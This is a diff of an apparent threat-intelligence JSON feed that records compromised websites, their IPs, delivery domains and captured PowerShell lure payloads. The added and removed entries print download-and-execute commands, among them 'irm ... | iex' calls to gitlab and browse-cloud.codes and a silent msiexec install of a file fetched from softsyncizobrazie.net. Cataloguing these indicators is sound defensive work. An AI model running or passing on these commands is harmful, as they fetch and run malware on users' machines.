@@ -1,5 +1,25 @@
 [
   {
+    "UrlDomain": "droid-digital.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.252.125"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881"
+    ],
+    "ReportId": "cmwh6rtfu0ot30omlftsxinhi",
+    "ScannedAt": "2026-11-15T01:59:05.218000+00:00"
+  },
+  {
     "UrlDomain": "ingenieriapyd.cl",
     "DeliveryUrl": [
       "softsyncizobrazie.net"
@@ -1180,46 +1200,5 @@
     ],
     "ReportId": "cmwej31qk0cf00omlfkkf1xkc",
     "ScannedAt": "2026-11-13T05:20:26.050000+00:00"
-  },
-  {
-    "UrlDomain": "unnorte.digital",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "162.241.203.246"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/aa57ea23162442f3",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/aa57ea23162442f3'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/aa57ea23162442f3"
-    ],
-    "ReportId": "cmwebrdpf0c2l0omlh3h75cni",
-    "ScannedAt": "2026-11-13T01:55:24.301000+00:00"
-  },
-  {
-    "UrlDomain": "lawservices.al",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "91.108.98.152"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwebebjc0c1o0oml57p74iht",
-    "ScannedAt": "2026-11-13T01:45:15.056000+00:00"
   }
 ]
